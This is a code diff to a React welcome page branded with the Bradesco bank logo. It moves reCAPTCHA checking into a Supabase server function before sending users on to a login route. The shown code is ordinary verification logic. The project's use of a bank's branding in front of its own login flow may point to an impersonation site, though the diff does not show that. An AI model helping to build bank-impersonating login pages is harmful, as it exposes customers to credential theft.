@@ -1,7 +1,8 @@
 import { useNavigate } from "react-router-dom";
-import { useCallback } from "react";
+import { useCallback, useState } from "react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { markSessionStarted } from "@/hooks/useRouteGuard";
+import { supabase } from "@/integrations/supabase/client";
 
 declare global {
   interface Window {
@@ -14,13 +15,31 @@ const RECAPTCHA_SITE_KEY = "6LcI5JQsAAAAAMsI-_QhAk89MSuKiPRLKK_KNJJK";
 
 const WelcomePage = () => {
   const navigate = useNavigate();
+  const [loading, setLoading] = useState(false);
 
-  const onRecaptchaSuccess = useCallback(() => {
-    markSessionStarted();
-    navigate("/login");
+  const onRecaptchaSuccess = useCallback(async (token: string) => {
+    setLoading(true);
+    try {
+      const { data, error } = await supabase.functions.invoke("verify-recaptcha", {
+        body: { token },
+      });
+
+      if (error || !data?.success) {
+        console.error("reCAPTCHA falhou:", error || data);
+        setLoading(false);
+        return;
+      }
+
+      markSessionStarted();
+      navigate("/login");
+    } catch (err) {
+      console.error("Erro ao verificar reCAPTCHA:", err);
+      setLoading(false);
+    }
   }, [navigate]);
 
   const handleClick = () => {
+    if (loading) return;
     window.onRecaptchaSuccess = onRecaptchaSuccess;
     if (window.grecaptcha) {
       window.grecaptcha.execute();
